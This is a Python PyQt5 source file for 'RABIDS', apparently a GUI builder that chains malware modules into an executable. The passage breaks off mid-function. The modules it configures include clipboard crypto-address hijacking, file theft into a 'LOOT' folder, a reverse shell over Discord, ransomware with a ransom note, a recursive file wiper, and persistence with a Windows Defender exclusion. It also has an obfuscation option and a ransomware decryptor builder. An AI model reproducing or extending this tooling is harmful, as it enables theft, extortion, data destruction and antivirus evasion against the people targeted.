import sys
import os
import shlex
import subprocess
from pathlib import Path
import tempfile
from PyQt5.QtWidgets import (
    QApplication, QMainWindow, QWidget, QVBoxLayout, QHBoxLayout,
    QPushButton, QLineEdit, QComboBox, QCheckBox, QTextEdit, QLabel, QGroupBox,
    QTabWidget, QTableWidget, QTableWidgetItem, QHeaderView, QFileDialog, QListWidget, QScrollArea,
    QListWidgetItem, QSizePolicy
)
from PyQt5.QtGui import QFont, QPixmap, QMovie
from PyQt5.QtCore import Qt, QThread, pyqtSignal

ASCII = r"""                                                                                                                                                                                                                         
"""

MODULES = {
    'module/ctrlvamp': {
        'desc': 'Hijacks clipboard crypto addresses (BTC, ETH, BEP-20, SOL).'
    },
    'module/dumpster': {
        'desc': 'Collects files from a directory and archives them into a single file.'
    },
    'module/ghostintheshell': {
        'desc': 'Provides a reverse shell over Discord for remote access.'
    },
    'module/krash': {
        'desc': 'Encrypts files in target directories and displays a ransom note.'
    },
    'module/poof': {
        'desc': 'Recursively deletes all files and folders from a target directory.'
    },
    'module/undeleteme': {
        'desc': 'Gains persistence and can add a Windows Defender exclusion.'
    }
}

MODULE_OPTIONS = {
    'module/ctrlvamp': {
        'btcAddress': '1A1zP1eP5QGefi2DMPTfTL5SLmv7DivfNa',
        'ethAddress': '0x1234567890abcdef1234567890abcdef12345678',
        'bep20Address': '0xabcdef1234567890abcdef1234567890abcdef12',
        'solAddress': '4k3Dyjzvzp8eMZWUXbBCjEvwSkkk59S5iCNLY3QrkX6R'
    },
    'module/dumpster': {
        'inputDir': '$HOME/Documents',
        'dumpsterFile': '$HOME/dumpster.dat'
    },
    'module/ghostintheshell': {
        'discordToken': 'YOUR_DISCORD_BOT_TOKEN',
        'creatorId': 'YOUR_DISCORD_USER_ID'
    },
    'module/krash': {
        'key': '0123456789abcdef0123456789abcdef',
        'iv': 'abcdef9876543210',
        'extension': '.locked',
        'targetDir': '$HOME/Documents',
        'htmlContent': 'YOUR_HTML_RANSOM_NOTE_CONTENT_HERE'
    },
    'module/poof': {
        'targetDir': '$HOME/Documents'
    },
    'module/undeleteme': {
        'persistence': 'true',
        'defenderExclusion': 'true'
    }
}

class BuildThread(QThread):
    log_signal = pyqtSignal(str, str)
    finished_signal = pyqtSignal(int)

    def __init__(self, command):
        super().__init__()
        self.command = command

    def run(self):
        try:
            process = subprocess.Popen(
                self.command,
                stdout=subprocess.PIPE,
                stderr=subprocess.STDOUT,
                text=True,
                bufsize=1,
                universal_newlines=True,
                encoding='utf-8',
                errors='replace'
            )
            for line in iter(process.stdout.readline, ''):
                line = line.strip()
                msg_type = "system"
                if "[+]" in line:
                    msg_type = "success"
                elif "[Error]" in line or "compilation failed" in line.lower() or "failed with exit code" in line.lower():
                    msg_type = "error"
                self.log_signal.emit(line, msg_type)
            process.stdout.close()
            return_code = process.wait()
            self.finished_signal.emit(return_code)
        except FileNotFoundError:
            self.log_signal.emit("Error: A required command (like python or nim) was not found.", "error")
            self.finished_signal.emit(-1)
        except Exception as e:
            self.log_signal.emit(f"An unexpected error occurred during build: {e}", "error")
            self.finished_signal.emit(-1)


class RABIDSGUI(QMainWindow):
    def __init__(self):
        super().__init__()
        self.setWindowTitle("RABIDS")
        self.script_dir = os.path.dirname(os.path.abspath(__file__))
        self.setGeometry(100, 100, 1000, 800)
        self.selected_modules = []
        self.loading_movie = None
        self.build_thread = None
        self.option_inputs = {}
        self.module_options_group = None
        self.loot_files_list = None
        self.init_ui()

    def init_ui(self):
        self.setStyleSheet("""
        QMainWindow, QWidget {
            background-color: #111113;
            color: #e0e0e0;
        }
        QPushButton {
            background-color: #1D1D1F;
            padding: 8px;
            border-radius: 10px;
        }
        QPushButton:hover {
            background-color: #2a2a2e;
        }
        QPushButton:pressed {
            background-color: #3c3c40;
        }
        QLineEdit, QComboBox, QCheckBox {
            font-weight: normal;
            padding: 4px;
            border-radius: 5px;
            background-color: #1D1D1F;
        }
        QGroupBox {
            border: none;
            margin-top: 10px;
            padding-top: 10px;
            font-weight: bold;
        }
        QGroupBox::title {
            subcontrol-origin: margin;
            left: 10px;
        }
        QTabWidget::pane {
            padding: 0;
            margin: 0;
            border: none;
        }
        QTabBar::tab {
            background: #1D1D1F;
            color: #e0e0e0;
            padding: 6px;
            border-radius: 10px;
            margin-right: 4px;
        }
        QTabBar::tab:selected {
            background: #2a2a2e;
            color: white;
        }
        QFrame {
            border: none;
        }
        """)

        central_widget = QWidget()
        self.setCentralWidget(central_widget)
        main_layout = QVBoxLayout(central_widget)

        self.tab_widget = QTabWidget()
        self.tab_widget.currentChanged.connect(self.on_tab_changed)
        main_layout.addWidget(self.tab_widget)

        builder_widget = QWidget()
        builder_layout = QHBoxLayout(builder_widget)

        title_font = QFont()
        title_font.setBold(True)
        title_font.setPointSize(12)
        subtitle_font = QFont()
        subtitle_font.setPointSize(10)

        left_layout = QVBoxLayout()

        self.module_options_group = QGroupBox("MODULE OPTIONS")
        self.module_options_group.setFont(title_font)
        module_options_group_layout = QVBoxLayout(self.module_options_group)

        scroll_area = QScrollArea()
        scroll_area.setWidgetResizable(True)
        scroll_area.setStyleSheet("QScrollArea { border: none; }")
        scroll_area.setVerticalScrollBarPolicy(Qt.ScrollBarAlwaysOff)
        scroll_area.setHorizontalScrollBarPolicy(Qt.ScrollBarAlwaysOff)

        scroll_content_widget = QWidget()
        self.options_layout = QVBoxLayout(scroll_content_widget)

        scroll_area.setWidget(scroll_content_widget)
        module_options_group_layout.addWidget(scroll_area)
        left_layout.addWidget(self.module_options_group, stretch=7)

        options_row1 = QHBoxLayout()
        self.obfuscate_check = QCheckBox("OBFUSCATE")
        self.obfuscate_check.setFont(subtitle_font)
        self.obfuscate_check.setChecked(False)
        self.obfuscate_check.stateChanged.connect(self.toggle_obfuscation)
        self.ollvm_input = QLineEdit("")
        self.ollvm_input.setFont(subtitle_font)
        options_row1.addWidget(self.obfuscate_check)
        options_row1.addWidget(self.ollvm_input)
        left_layout.addLayout(options_row1)

        options_row2 = QHBoxLayout()
        exe_name_label = QLabel("EXE NAME")
        exe_name_label.setFont(subtitle_font)
        self.exe_name_input = QLineEdit("payload")
        self.exe_name_input.setFont(subtitle_font)
        options_row2.addWidget(exe_name_label)
        options_row2.addWidget(self.exe_name_input, 1)

        target_os_label = QLabel("OS")
        target_os_label.setFont(subtitle_font) 
        self.target_os_combo = QComboBox()
        self.target_os_combo.addItems(["windows", "linux", "macos"])
        self.target_os_combo.setFont(subtitle_font)
        self.target_os_combo.currentTextChanged.connect(self.update_obfuscation_for_os)
        options_row2.addWidget(target_os_label)
        options_row2.addWidget(self.target_os_combo, 1)

        target_arch_label = QLabel("PROCESSOR")
        target_arch_label.setFont(subtitle_font)
        self.target_arch_combo = QComboBox()
        self.target_arch_combo.addItems(["amd64", "arm64"])
        self.target_arch_combo.setFont(subtitle_font)
        options_row2.addWidget(target_arch_label)
        options_row2.addWidget(self.target_arch_combo, 1)
        left_layout.addLayout(options_row2)

        build_btn_layout = QHBoxLayout()
        build_btn_layout.addStretch()
        self.build_btn = QPushButton("BUILD")
        self.build_btn.setFont(subtitle_font)
        self.build_btn.clicked.connect(self.run_compiler)
        build_btn_layout.addWidget(self.build_btn)
        build_btn_layout.addStretch()
        left_layout.addLayout(build_btn_layout)

        banner_layout = QHBoxLayout()
        self.banner_label = QLabel("Banner Placeholder")
        self.banner_label.setFont(subtitle_font)
        banner_path = os.path.join(self.script_dir, "ASSETS", "banner.png")
        movie = QMovie(banner_path)
        if movie.isValid():
            self.banner_label.setMovie(movie)
            movie.start()
        self.banner_label.setFixedHeight(50)
        self.banner_label.setAlignment(Qt.AlignCenter)
        banner_layout.addWidget(self.banner_label, stretch=1)
        left_layout.addLayout(banner_layout)

        builder_layout.addLayout(left_layout, 6)

        right_layout = QVBoxLayout()
        module_select_layout = QVBoxLayout()
        module_select_layout.setContentsMargins(0, 12, 0, 0)
        module_label = QLabel("MODULES")
        module_label.setFont(title_font)
        module_select_layout.addWidget(module_label)
        self.module_combo = QComboBox()
        self.module_combo.setFont(subtitle_font)
        self.module_combo.addItem("SELECT MODULE")
        for module in MODULES.keys():
            self.module_combo.addItem(module.split('/')[-1])
        self.module_combo.currentTextChanged.connect(self.update_module_description)
        self.module_combo.setSizePolicy(QSizePolicy.Expanding, QSizePolicy.Fixed)
        module_select_layout.addWidget(self.module_combo)
        self.add_module_btn = QPushButton("ADD MODULE")
        self.add_module_btn.setFont(subtitle_font)
        self.add_module_btn.clicked.connect(self.add_module)
        self.add_module_btn.setSizePolicy(QSizePolicy.Expanding, QSizePolicy.Fixed)
        module_select_layout.addWidget(self.add_module_btn)
        right_layout.addLayout(module_select_layout)
        self.module_desc_label = QLabel("Select a module to view its description")
        self.module_desc_label.setFont(subtitle_font)
        self.module_desc_label.setStyleSheet("color: #F4A87C;")
        self.module_desc_label.setWordWrap(True)
        self.module_desc_label.setMaximumWidth(400)
        self.module_desc_label.setFixedHeight(40)
        right_layout.addWidget(self.module_desc_label)

        module_chain_label = QLabel("MODULE CHAIN")
        module_chain_label.setFont(title_font)
        right_layout.addWidget(module_chain_label)
        self.module_table = QTableWidget()
        self.module_table.setFont(subtitle_font)
        self.module_table.setColumnCount(4)
        self.module_table.setHorizontalHeaderLabels(["Module", "", "", ""])
        self.module_table.horizontalHeader().setSectionResizeMode(0, QHeaderView.Stretch)
        self.module_table.setColumnWidth(1, 50)
        self.module_table.setColumnWidth(2, 50)
        self.module_table.setColumnWidth(3, 50)
        self.module_table.setStyleSheet("background-color: #111113;")
        self.module_table.cellClicked.connect(self.on_module_clicked)
        right_layout.addWidget(self.module_table)

        builder_layout.addLayout(right_layout, 4)

        output_widget = QWidget()
        output_layout = QVBoxLayout(output_widget)
        output_layout.setContentsMargins(15, 15, 15, 15)
        self.output_log = QTextEdit()
        self.output_log.setFont(subtitle_font)
        self.output_log.setReadOnly(True)
        self.output_log.setPlaceholderText(ASCII)
        self.output_log.setStyleSheet("background-color: #111113; color: #00A9FD;")
        output_layout.addWidget(self.output_log, 3)

        loot_section_layout = QHBoxLayout()

        folder_icon_label = QLabel()
        folder_icon_path = os.path.join(self.script_dir, "ASSETS", "folder.png")
        pixmap = QPixmap(folder_icon_path)
        if not pixmap.isNull():
            folder_icon_label.setPixmap(pixmap.scaled(200, 200, Qt.KeepAspectRatio, Qt.SmoothTransformation))
        folder_icon_label.setAlignment(Qt.AlignCenter)
        loot_section_layout.addWidget(folder_icon_label, 2)

        loot_content_widget = QWidget()
        loot_content_layout = QVBoxLayout(loot_content_widget)
        loot_content_layout.setContentsMargins(0, 0, 0, 0)

        loot_header_layout = QHBoxLayout()
        loot_label = QLabel("LOOT")
        loot_label.setFont(title_font)
        loot_header_layout.addWidget(loot_label)
        loot_header_layout.addStretch()
        refresh_loot_btn = QPushButton("⟳ Refresh")
        refresh_loot_btn.clicked.connect(self.update_loot_folder_view)
        loot_header_layout.addWidget(refresh_loot_btn)
        open_loot_btn = QPushButton("Open Folder")
        open_loot_btn.clicked.connect(self.open_loot_folder)
        loot_header_layout.addWidget(open_loot_btn)
        loot_content_layout.addLayout(loot_header_layout)

        self.loot_files_list = QListWidget()
        self.loot_files_list.setFont(subtitle_font)
        self.loot_files_list.setStyleSheet("background-color: #1D1D1F;")
        loot_content_layout.addWidget(self.loot_files_list)

        loot_section_layout.addWidget(loot_content_widget, 8)
        output_layout.addLayout(loot_section_layout, 1)

        docs_widget = QWidget()
        docs_layout = QVBoxLayout(docs_widget)
        docs_layout.setContentsMargins(15, 15, 15, 15)

        docs_text = QTextEdit()
        docs_text.setFont(subtitle_font)
        docs_text.setReadOnly(True)

        doc_path = os.path.join(self.script_dir, "DOCUMENTATION.md")
        try:
            with open(doc_path, 'r', encoding='utf-8') as f:
                doc_content = f.read()
            docs_text.setMarkdown(doc_content)
        except FileNotFoundError:
            docs_text.setText("Error: DOCUMENTATION.md not found.")

        docs_text.setStyleSheet("background-color: #111113;")
        docs_layout.addWidget(docs_text)

        garbage_collector_widget = QWidget()
        garbage_collector_layout = QVBoxLayout(garbage_collector_widget)
        garbage_collector_layout.setContentsMargins(15, 15, 15, 15)
        garbage_collector_layout.setSpacing(15)

        top_widget = QWidget()
        top_layout = QHBoxLayout(top_widget)

        icon_label = QLabel()
        icon_path = os.path.join(self.script_dir, "ASSETS", "garbage.png")
        pixmap = QPixmap(icon_path)
        if not pixmap.isNull():
            icon_label.setPixmap(pixmap.scaled(300, 300, Qt.KeepAspectRatio, Qt.SmoothTransformation))
        icon_label.setAlignment(Qt.AlignCenter)
        top_layout.addWidget(icon_label, 3)

        restore_options_group = QGroupBox("RESTORE FILES FROM DUMPSTER")
        restore_options_group.setFont(title_font)
        restore_options_layout = QVBoxLayout(restore_options_group)

        desc_label = QLabel("Select a dumpster file and a destination directory to restore its contents.")
        desc_label.setFont(subtitle_font)
        desc_label.setStyleSheet("color: #00B85B;")
        desc_label.setWordWrap(True)
        restore_options_layout.addWidget(desc_label)

        dumpster_file_label = QLabel("Dumpster File Path")
        dumpster_file_label.setFont(subtitle_font)
        dumpster_file_label.setStyleSheet("color: #93dbb6;")
        dumpster_file_layout = QHBoxLayout()
        self.restore_dumpster_file_edit = QLineEdit()
        dumpster_file_btn = QPushButton("Browse...")
        dumpster_file_btn.clicked.connect(lambda: self.browse_open_file(self.restore_dumpster_file_edit))
        dumpster_file_layout.addWidget(dumpster_file_label)
        dumpster_file_layout.addWidget(self.restore_dumpster_file_edit)
        dumpster_file_layout.addWidget(dumpster_file_btn)
        restore_options_layout.addLayout(dumpster_file_layout)

        output_dir_label = QLabel("Destination Directory")
        output_dir_label.setFont(subtitle_font)
        output_dir_label.setStyleSheet("color: #93dbb6;")
        output_dir_layout = QHBoxLayout()
        self.restore_output_dir_edit = QLineEdit()
        output_dir_btn = QPushButton("Browse...")
        output_dir_btn.clicked.connect(lambda: self.browse_directory(self.restore_output_dir_edit))
        output_dir_layout.addWidget(output_dir_label)
        output_dir_layout.addWidget(self.restore_output_dir_edit)
        output_dir_layout.addWidget(output_dir_btn)
        restore_options_layout.addLayout(output_dir_layout)

        restore_btn = QPushButton("Restore")
        restore_btn.setFont(subtitle_font)
        restore_btn.setSizePolicy(QSizePolicy.Expanding, QSizePolicy.Fixed)
        restore_btn.clicked.connect(self.run_garbage_collector_restore)
        restore_options_layout.addWidget(restore_btn)
        restore_options_layout.addStretch()
        top_layout.addWidget(restore_options_group, 7)

        bottom_widget = QWidget()
        bottom_layout = QVBoxLayout(bottom_widget)

        dest_folder_group = QGroupBox()
        dest_folder_layout = QVBoxLayout(dest_folder_group)

        dest_header_layout = QHBoxLayout()
        refresh_dest_btn = QPushButton("⟳ Refresh")
        refresh_dest_btn.clicked.connect(self.update_restore_destination_view)
        dest_header_layout.addWidget(refresh_dest_btn, 0, Qt.AlignRight)
        dest_folder_layout.addLayout(dest_header_layout)

        self.restore_dest_files_list = QListWidget()
        self.restore_dest_files_list.setFont(subtitle_font)
        self.restore_dest_files_list.setStyleSheet("background-color: #1D1D1F;")
        dest_folder_layout.addWidget(self.restore_dest_files_list)
        bottom_layout.addWidget(dest_folder_group)

        garbage_collector_layout.addWidget(top_widget, 4)
        garbage_collector_layout.addWidget(bottom_widget, 6)

        uncrash_widget = QWidget()
        uncrash_layout = QVBoxLayout(uncrash_widget)
        uncrash_layout.setContentsMargins(15, 15, 15, 15)
        uncrash_layout.setSpacing(15)

        uncrash_options_group = QGroupBox("DECRYPTOR")
        uncrash_options_group.setFont(title_font)
        uncrash_options_layout = QVBoxLayout(uncrash_options_group)

        uncrash_desc_label = QLabel("Build a standalone decryptor for files encrypted by the 'krash' module.\nEnsure the Key and IV match the ones used for encryption.")
        uncrash_desc_label.setFont(subtitle_font)
        uncrash_desc_label.setStyleSheet("color: #FFF200;")
        uncrash_desc_label.setWordWrap(True)
        uncrash_options_layout.addWidget(uncrash_desc_label)
        uncrash_options_layout.addSpacing(10)

        key_layout = QHBoxLayout()
        key_label = QLabel("Key")
        key_label.setFont(subtitle_font)
        key_label.setStyleSheet("color: #f7f294;")
        self.uncrash_key_edit = QLineEdit("0123456789abcdef0123456789abcdef")
        self.uncrash_key_edit.setFont(subtitle_font)
        key_layout.addWidget(key_label)
        key_layout.addWidget(self.uncrash_key_edit)
        uncrash_options_layout.addLayout(key_layout)

        iv_layout = QHBoxLayout()
        iv_label = QLabel("IV")
        iv_label.setFont(subtitle_font)
        iv_label.setStyleSheet("color: #f7f294;")
        self.uncrash_iv_edit = QLineEdit("abcdef9876543210")
        self.uncrash_iv_edit.setFont(subtitle_font)
        iv_layout.addWidget(iv_label)
        iv_layout.addWidget(self.uncrash_iv_edit)
        uncrash_options_layout.addLayout(iv_layout)

        ext_layout = QHBoxLayout()
        ext_label = QLabel("Extension")
        ext_label.setFont(subtitle_font)
        ext_label.setStyleSheet("color: #f7f294;")
        self.uncrash_ext_edit = QLineEdit(".locked")
        self.uncrash_ext_edit.setFont(subtitle_font)
        ext_layout.addWidget(ext_label)
        ext_layout.addWidget(self.uncrash_ext_edit)
        uncrash_options_layout.addLayout(ext_layout)

        uncrash_build_options_layout = QHBoxLayout()
        uncrash_exe_label = QLabel("EXE Name")
        uncrash_exe_label.setFont(subtitle_font)
        uncrash_exe_label.setStyleSheet("color: #f7f294;")
        self.uncrash_exe_name_edit = QLineEdit("decryptor")
        uncrash_os_label = QLabel("OS")
        uncrash_os_label.setFont(subtitle_font) 
        self.uncrash_os_combo = QComboBox()
        self.uncrash_os_combo.addItems(["windows", "linux", "macos"])
        uncrash_arch_label = QLabel("Processor")
        uncrash_arch_label.setFont(subtitle_font)
        self.uncrash_arch_combo = QComboBox()
        self.uncrash_arch_combo.addItems(["amd64", "arm64"])
        uncrash_build_options_layout.addWidget(uncrash_exe_label)
        uncrash_build_options_layout.addWidget(self.uncrash_exe_name_edit, 1)
        uncrash_build_options_layout.addWidget(uncrash_os_label)
        uncrash_build_options_layout.addWidget(self.uncrash_os_combo, 1)
        uncrash_build_options_layout.addWidget(uncrash_arch_label)
        uncrash_build_options_layout.addWidget(self.uncrash_arch_combo, 1)
        uncrash_options_layout.addLayout(uncrash_build_options_layout)

        self.uncrash_build_btn = QPushButton("BUILD DECRYPTOR")
        self.uncrash_build_btn.setFont(subtitle_font)
        self.uncrash_build_btn.clicked.connect(self.run_uncrash_compiler)
        uncrash_options_layout.addWidget(self.uncrash_build_btn)

        uncrash_layout.addWidget(uncrash_options_group)

        bottom_section_layout = QHBoxLayout()

        left_column_widget = QWidget()
        left_column_layout = QVBoxLayout(left_column_widget)
        
        encrypted_devices_label = QLabel("ENCRYPTED DEVICES")
        encrypted_devices_label.setFont(title_font)
        self.encrypted_devices_table = QTableWidget()
        self.encrypted_devices_table.setColumnCount(2)
        self.encrypted_devices_table.setHorizontalHeaderLabels(["Device", "Status"])
        self.encrypted_devices_table.horizontalHeader().setSectionResizeMode(0, QHeaderView.Stretch)
        self.encrypted_devices_table.horizontalHeader().setSectionResizeMode(1, QHeaderView.ResizeToContents)
        
        left_column_layout.addWidget(encrypted_devices_label)
        left_column_layout.addWidget(self.encrypted_devices_table)
        
        uncrash_image_label = QLabel()
        uncrash_image_path = os.path.join(self.script_dir, "ASSETS", "unkrash.png")
        pixmap = QPixmap(uncrash_image_path)
        if not pixmap.isNull():
            uncrash_image_label.setPixmap(pixmap.scaled(400, 400, Qt.KeepAspectRatio, Qt.SmoothTransformation))
        uncrash_image_label.setAlignment(Qt.AlignCenter)

        bottom_section_layout.addWidget(left_column_widget, 6)
        bottom_section_layout.addWidget(uncrash_image_label, 4) 

        uncrash_layout.addLayout(bottom_section_layout)

        self.tab_widget.addTab(builder_widget, "BUILDER")
        self.tab_widget.addTab(output_widget, "OUTPUT")
        self.tab_widget.addTab(uncrash_widget, "KRASH")
        self.tab_widget.addTab(garbage_collector_widget, "GARBAGE COLLECTOR")
        self.tab_widget.addTab(docs_widget, "DOCUMENTATION")
        self.update_loot_folder_view()
        self.update_module_description("SELECT MODULE")
        self.update_module_table()
        self.update_options_layout()
        self.update_obfuscation_for_os(self.target_os_combo.currentText())

    def on_tab_changed(self, index):
        if self.tab_widget.tabText(index) == "OUTPUT":
            self.update_loot_folder_view()
        elif self.tab_widget.tabText(index) == "GARBAGE COLLECTOR":
            self.update_restore_destination_view()

    def open_loot_folder(self):
        loot_dir = Path(self.script_dir) / 'LOOT'
        if not loot_dir.is_dir():
            self.log_message(f"loot directory not found: {loot_dir}", "error")
            loot_dir.mkdir(exist_ok=True)
            self.log_message(f"created loot directory: {loot_dir}", "system")

        if sys.platform == "win32":
            os.startfile(loot_dir)
        elif sys.platform == "darwin":
            subprocess.Popen(["open", str(loot_dir)])
        else:
            subprocess.Popen(["xdg-open", str(loot_dir)])
        self.update_loot_folder_view()

    def update_loot_folder_view(self):
        self.loot_files_list.clear()
        loot_dir = Path(self.script_dir) / 'LOOT'
        if not loot_dir.is_dir():
            self.loot_files_list.addItem("loot directory not found")
            return
        try:
            files = [f for f in loot_dir.iterdir() if f.is_file()]
            if not files:
                self.loot_files_list.addItem("loot directory is empty")
                return

            for file_path in sorted(files, key=os.path.getmtime, reverse=True):
                self.loot_files_list.addItem(QListWidgetItem(file_path.name))
        except Exception as e:
            self.loot_files_list.addItem(f"Error reading LOOT directory: {e}")

    def update_module_description(self, module_name):
        if module_name == "SELECT MODULE":
            self.module_desc_label.setText("Select a module to view its description")
        else:
            full_module = f"module/{module_name}"
            self.module_desc_label.setText(MODULES.get(full_module, {}).get('desc', 'No description available'))

    def update_options_layout(self, focused_module=None):
        for i in reversed(range(self.options_layout.count())):
            layout_item = self.options_layout.itemAt(i)
            if layout_item.widget():
                layout_item.widget().deleteLater()
            elif layout_item.layout():
                while layout_item.layout().count():
                    child = layout_item.layout().takeAt(0)
                    if child.widget():
                        child.widget().deleteLater()
                layout_item.layout().deleteLater()
            elif layout_item.spacerItem():
                self.options_layout.removeItem(layout_item)
        self.option_inputs.clear()

        subtitle_font = QFont()
        subtitle_font.setPointSize(10)

        title_font = QFont()
        title_font.setBold(True)
        title_font.setPointSize(12)

        if not self.selected_modules:
            icon_label = QLabel()
            icon_path = os.path.join(self.script_dir, "ASSETS", "normal.png")
            pixmap = QPixmap(icon_path)
            if not pixmap.isNull():
                icon_label.setPixmap(pixmap.scaled(500, 500, Qt.KeepAspectRatio, Qt.SmoothTransformation))
            else:
                icon_label.setText("Add a module to see its options")
            icon_label.setAlignment(Qt.AlignCenter)
            self.options_layout.addStretch()
            self.options_layout.addWidget(icon_label, 0, Qt.AlignCenter)
            self.module_options_group.setTitle("MODULE OPTIONS")
            return

        modules_to_show = [focused_module] if focused_module else self.selected_modules

        if focused_module:
            self.module_options_group.setTitle(f"{focused_module.split('/')[-1].upper()} OPTIONS")
            self.module_options_group.setFont(title_font)
        else:
            self.module_options_group.setTitle("MODULE OPTIONS")

        has_any_options = False
        for module_name in modules_to_show:
            if module_name not in MODULE_OPTIONS or not MODULE_OPTIONS[module_name]:
                continue

            has_any_options = True

            if not focused_module and len(self.selected_modules) > 1:
                module_label = QLabel(f"{module_name.split('/')[-1].upper()} OPTIONS")
                module_label.setStyleSheet("font-weight: bold; color: #999;")
                module_label.setFont(title_font)
                self.options_layout.addWidget(module_label)

            for option, value in MODULE_OPTIONS[module_name].items():
                option_row = QHBoxLayout()
                option_label = QLabel(f"{option}:")
                option_label.setFont(subtitle_font)
                option_label.setStyleSheet("color: #F4A87C;")
                if option in ['persistence', 'defenderExclusion']:
                    input_widget = QCheckBox()
                    input_widget.setFont(subtitle_font)
                    try:
                        is_checked = str(value).lower() in ('true', '1', 'yes', 'on')
                        input_widget.setChecked(is_checked)
                    except:
                        input_widget.setChecked(False)
                else:
                    input_widget = QLineEdit(value)
                    input_widget.setFont(subtitle_font)
                option_row.addWidget(option_label)
                option_row.addWidget(input_widget)
                self.options_layout.addLayout(option_row)
                self.option_inputs[f"{module_name}:{option}"] = input_widget
            if not focused_module:
                self.options_layout.addSpacing(10)

        if not has_any_options:
            no_options_label = QLabel("No configurable options for the selected module(s).")
            no_options_label.setFont(subtitle_font)
            no_options_label.setAlignment(Qt.AlignCenter)
            self.options_layout.addStretch()
            self.options_layout.addWidget(no_options_label, 0, Qt.AlignCenter)
            self.options_layout.addStretch()
        else:
            self.options_layout.addStretch()

    def add_module(self):
        module_name = self.module_combo.currentText()
        if module_name == "SELECT MODULE":
            self.log_message("Error: No module selected.", "error")
            return
        full_module = f"module/{module_name}"
        if full_module in self.selected_modules:
            self.log_message(f"Error: Module {module_name} already added.", "error")
            return
        if full_module in MODULES:
            self.selected_modules.append(full_module)
            self.log_message(f"Added module: {module_name}", "success")
            self.update_module_table()
            self.update_options_layout()

    def remove_module(self, row):
        if 0 <= row < len(self.selected_modules):
            module_name = os.path.basename(self.selected_modules[row])
            self.selected_modules.pop(row)
            self.log_message(f"Removed module: {module_name}", "success")
            self.update_module_table()
            self.update_options_layout()

    def on_module_clicked(self, row, column):
        if 0 <= row < len(self.selected_modules):
            self.update_options_layout()

    def move_module_up(self, row):
        if row > 0:
            self.selected_modules[row], self.selected_modules[row - 1] = self.selected_modules[row - 1], self.selected_modules[row]
            self.update_module_table()
            self.update_options_layout()

    def move_module_down(self, row):
        if row < len(self.selected_modules) - 1:
            self.selected_modules[row], self.selected_modules[row + 1] = self.selected_modules[row + 1], self.selected_modules[row]
            self.update_module_table()
            self.update_options_layout()

    def update_module_table(self):
        self.module_table.setRowCount(len(self.selected_modules))
        for i, module in enumerate(self.selected_modules):
            module_name = module.split('/')[-1]
            name_item = QTableWidgetItem(module_name) 
            name_item.setFont(QFont("Arial", 10))
            name_item.setTextAlignment(Qt.AlignLeft | Qt.AlignVCenter)
            self.module_table.setItem(i, 0, name_item)

            up_btn = QPushButton("↑")
            up_btn.setFont(QFont("Arial", 8))
            up_btn.clicked.connect(lambda _, r=i: self.move_module_up(r))
            up_btn.setEnabled(i > 0)
            self.module_table.setCellWidget(i, 1, up_btn)

            down_btn = QPushButton("↓")
            down_btn.setFont(QFont("Arial", 8))
            down_btn.clicked.connect(lambda _, r=i: self.move_module_down(r))
            down_btn.setEnabled(i < len(self.selected_modules) - 1)
            self.module_table.setCellWidget(i, 2, down_btn)

            remove_btn = QPushButton("X")
            remove_btn.setFont(QFont("Arial", 8))
            remove_btn.clicked.connect(lambda _, r=i: self.remove_module(r))
            self.module_table.setCellWidget(i, 3, remove_btn)

        for i in range(self.module_table.rowCount()):
            self.module_table.setRowHeight(i, 30)

    def toggle_obfuscation(self):
        self.ollvm_input.setEnabled(self.obfuscate_check.isChecked())

    def update_obfuscation_for_os(self, os_name):
        if os_name in ("linux", "macos"):
            self.obfuscate_check.setEnabled(False)
            self.obfuscate_check.setChecked(False)
            self.ollvm_input.setEnabled(False)
        else:
            self.obfuscate_check.setEnabled(True)
            self.toggle_obfuscation()

    def show_loading_view(self):
        for i in reversed(range(self.options_layout.count())):
            layout_item = self.options_layout.itemAt(i)
            if layout_item.widget():
                layout_item.widget().deleteLater()
            elif layout_item.layout():
                while layout_item.layout().count():
                    child = layout_item.layout().takeAt(0)
                    if child.widget():
                        child.widget().deleteLater()
                layout_item.layout().deleteLater()
            elif layout_item.spacerItem():
                self.options_layout.removeItem(layout_item)

        self.option_inputs.clear()

        icon_label = QLabel()
        icon_path = os.path.join(self.script_dir, "ASSETS", "loading.gif")
        self.loading_movie = QMovie(icon_path)
        if not self.loading_movie.isValid():
            icon_label.setText("Building...")
            icon_label.setStyleSheet("color: #F4A87C;")
        else:
            icon_label.setMovie(self.loading_movie)
            original_size = self.loading_movie.frameRect().size()
            scaled_size = original_size.scaled(500, 500, Qt.KeepAspectRatio)
            self.loading_movie.setScaledSize(scaled_size)
            self.loading_movie.start()
        icon_label.setAlignment(Qt.AlignCenter)
        self.options_layout.addStretch()
        self.options_layout.addWidget(icon_label, 0, Qt.AlignCenter)
        self.options_layout.addStretch()
        QApplication.processEvents()

    def clear_loading_view(self):
        if self.loading_movie:
            self.loading_movie.stop()
            self.loading_movie = None
        for i in reversed(range(self.options_layout.count())):
            layout_item = self.options_layout.itemAt(i)
            if layout_item.widget():
                layout_item.widget().deleteLater()
            elif layout_item.layout():
                while layout_item.layout().count():
                    child = layout_item.layout().takeAt(0)
                    if child.widget():
                        child.widget().deleteLater()
                layout_item.layout().deleteLater()
            elif layout_item.spacerItem():
                self.options_layout.removeItem(layout_item)

    def log_message(self, message, msg_type="system"):
        if msg_type == "error":
            color = "#D81960"
        elif msg_type == "success":
            color = "#B7CE42"
        elif msg_type == "system":
            color = "#FFA473"
        else:
            color = "#00A9FD"

        if not message.strip():
            return

        self.output_log.append(f'<font color="{color}">{message}</font>')

    def build_finished(self, return_code):
        if return_code == 0:
            self.log_message("\n[+] Build finished successfully.", "success")
            self.module_options_group.setTitle("BUILD SUCCESS")
            self.clear_loading_view()
            icon_label = QLabel()
            icon_path = os.path.join(self.script_dir, "ASSETS", "success.png")
            pixmap = QPixmap(icon_path)
            if not pixmap.isNull():
                icon_label.setPixmap(pixmap.scaled(500, 500, Qt.KeepAspectRatio, Qt.SmoothTransformation))
            else:
                icon_label.setText("Build Successful!")
            icon_label.setAlignment(Qt.AlignCenter)
            self.options_layout.addStretch()
            self.options_layout.addWidget(icon_label, 0, Qt.AlignCenter)
            self.options_layout.addStretch()
            self.update_loot_folder_view()
        else:
            self.log_message(f"\n[-] Build failed with exit code {return_code}.", "error")
            self.module_options_group.setTitle("ERROR SEE OUTPUT TAB")
            self.clear_loading_view()
            icon_label = QLabel()
            icon_path = os.path.join(self.script_dir, "ASSETS", "error.png")
            pixmap = QPixmap(icon_path)
            if not pixmap.isNull():
                icon_label.setPixmap(pixmap.scaled(500, 500, Qt.KeepAspectRatio, Qt.SmoothTransformation))
            else:
